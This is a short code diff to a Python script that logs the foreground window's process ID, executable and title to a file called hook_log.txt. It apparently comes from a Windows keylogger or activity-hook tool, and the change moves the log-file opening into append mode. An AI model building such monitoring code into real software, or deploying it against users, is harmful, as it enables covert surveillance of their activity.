@@ -11,7 +11,7 @@ psapi = windll.psapi
 current_window = None
 
 file_name = "C:\\Users\\lenovo\\Documents\\hook_log.txt" 
-fobj = open(file_name, 'w') 
+
 
 def get_current_process():
 
@@ -37,6 +37,7 @@ def get_current_process():
     length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
 
     # 输出进程相关信息
+    fobj = open(file_name,  'a')
     fobj.write("[ PID: %s - %s - %s]" % (process_id, executable.value, window_title.value))
 
     # 关闭句柄
